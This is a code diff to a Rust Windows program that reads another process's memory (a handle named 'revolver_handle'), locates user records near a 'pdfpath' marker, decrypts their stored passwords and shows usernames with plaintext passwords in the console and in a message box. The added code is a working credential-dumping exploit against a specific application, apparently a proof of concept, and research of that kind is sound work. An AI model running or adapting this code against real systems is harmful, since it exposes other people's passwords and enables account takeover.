@@ -1,17 +1,21 @@
-use std::{ptr, slice, str};
+use std::{fmt::Write, ptr, slice, str};
 
-use windows::Win32::{
-    Foundation::HANDLE,
-    System::{
-        Diagnostics::{
-            Debug::ReadProcessMemory,
-            ToolHelp::{
-                CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
-                TH32CS_SNAPPROCESS,
+use windows::{
+    core::{s, PCSTR},
+    Win32::{
+        Foundation::HANDLE,
+        System::{
+            Diagnostics::{
+                Debug::ReadProcessMemory,
+                ToolHelp::{
+                    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
+                    TH32CS_SNAPPROCESS,
+                },
             },
+            Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT},
+            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
         },
-        Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT},
-        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
+        UI::WindowsAndMessaging::{MessageBoxA, MB_OK},
     },
 };
 
@@ -115,22 +119,66 @@ impl Iterator for ProcessMemoryRegions {
         };
         mem.truncate(read);
 
-        println!(
-            "read mem at {:?} sz: {}",
-            meminfo.BaseAddress, meminfo.RegionSize
-        );
-
         Some(mem)
     }
 }
 
 trait SlicePosition<T> {
     fn position(&self, search: &[T]) -> Option<usize>;
+    fn starting_at_position(&self, search: &[T]) -> Option<Self>
+    where
+        Self: Sized;
 }
 
 impl<T: PartialEq> SlicePosition<T> for &[T] {
     fn position(&self, search: &[T]) -> Option<usize> {
         self.windows(search.len()).position(|win| win == search)
+    }
+
+    fn starting_at_position(&self, search: &[T]) -> Option<Self> {
+        self.position(search).map(|pos| &self[pos + search.len()..])
+    }
+}
+
+#[derive(Debug, PartialEq)]
+struct User {
+    username_initials: String,
+    plaintext_pw: String,
+}
+
+impl User {
+    fn try_from_parsed_data(data: &[u8]) -> Option<Self> {
+        let data = &data[..data.position(b"false")?];
+        if &data[data.len() - 4..] != b"0801" {
+            // 0801 -- User
+            // 1801 -- Admin
+            return None;
+        }
+        let data = &data[..data.len() - 4];
+
+        let username_padding = {
+            let p = data.len() % 4;
+            if p == 0 {
+                4
+            } else {
+                p
+            }
+        };
+
+        let mut username_length = username_padding;
+        while username_length < data.len() {
+            let encrypted_pw_b64 = str::from_utf8(&data[username_length..]).ok()?;
+            if let Ok(plaintext_pw) = decrypt::decrypt_password(encrypted_pw_b64) {
+                return Some(Self {
+                    username_initials: String::from_utf8_lossy(&data[..username_length]).into_owned(),
+                    plaintext_pw
+                });
+            }
+
+            username_length += 4;
+        }
+
+        None
     }
 }
 
@@ -146,16 +194,35 @@ fn main() -> Result<(), Error> {
         )?
     };
 
+    let mut users: Vec<User> = Vec::new();
+
     for region in ProcessMemoryRegions::new(revolver_handle) {
-        let search = b"pdfpath";
-        if let Some(pos) = region.as_slice().position(b"pdfpath") {
-            let entry = String::from_utf8_lossy(&region[pos - 10..pos + search.len() + 10]);
-            println!("FOUND: {entry}");
-            break;
+        if let Some(db_entry) = region.as_slice().starting_at_position(b"pdfpath") {
+            let db_entry = &db_entry[..0x100];
+            if let Some(user_data) = db_entry.starting_at_position(b"user") {
+                if let Some(u) = User::try_from_parsed_data(user_data) {
+                    if !users.contains(&u) {
+                        users.push(u);
+                    }
+                }
+            }
         }
     }
 
-    // MessageBoxA(None, s!("Test"), s!("Test dialog!"), MB_OK);
+    let mut desc = String::new();
+    for user in users {
+        writeln!(
+            &mut desc,
+            "{}: {}",
+            user.username_initials, user.plaintext_pw
+        )
+        .expect("Failed to write to string");
+    }
+
+    println!("{desc}");
+    unsafe {
+        MessageBoxA(None, PCSTR::from_raw(desc.as_ptr()), s!("User data"), MB_OK);
+    }
 
     Ok(())
 }
